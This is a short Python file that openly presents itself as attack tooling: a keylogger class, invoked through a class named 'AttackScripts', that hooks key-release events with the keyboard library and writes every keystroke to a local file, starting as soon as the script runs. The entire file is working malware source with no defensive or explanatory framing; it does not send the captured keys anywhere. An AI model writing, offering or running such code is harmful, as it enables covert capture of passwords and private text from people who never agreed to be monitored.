import keyboard

class keylogger():
    def __init__(self):
        self.keys_file = open("keylogger", 'w')

    def start_log(self):
        keyboard.on_release(callback=self.callback)
        keyboard.wait()

    def callback(self, event):
        current_button = event.name
        if current_button == "space":
            self.keys_file.write(" ")
        elif current_button == "backspace" or current_button == "shift":
            self.keys_file.write("")
        elif current_button == "enter":
            self.keys_file.write("\n")
        else:
            self.keys_file.write(current_button)
        self.keys_file.flush()


class AttackScripts():
    def __init__(self):
        self.keylogger = keylogger()

    def start_keylogger(self):
        self.keylogger.start_log()


t1 = AttackScripts()
t1.start_keylogger()



